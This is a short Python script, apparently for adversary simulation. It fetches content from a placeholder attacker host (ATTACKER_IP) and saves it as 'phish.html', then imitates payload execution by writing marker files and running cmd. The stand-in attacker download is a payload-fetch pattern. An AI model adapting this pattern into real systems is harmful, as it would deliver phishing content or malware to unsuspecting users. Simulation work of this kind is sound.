#!/usr/bin/env python3
import requests, os, subprocess, sys, time
ATTACKER = 'http://<ATTACKER_IP>:8080'  # replace with attacker IP

def fetch():
    r = requests.get(ATTACKER + '/')
    open('C:\\temp\\phish.html','wb').write(r.content if isinstance(r.content, bytes) else r.content.encode())
    # simulate execution: create files and a small log entry
    os.makedirs('C:\\temp', exist_ok=True)
    with open('C:\\temp\\dropped.txt','w') as f:
        f.write('benign payload executed\n')
    subprocess.run(['cmd','/c','echo payload executed >> C:\\temp\\dropped_log.txt'])
    print('Payload fetched and simulated.')

if __name__ == '__main__':
    fetch()
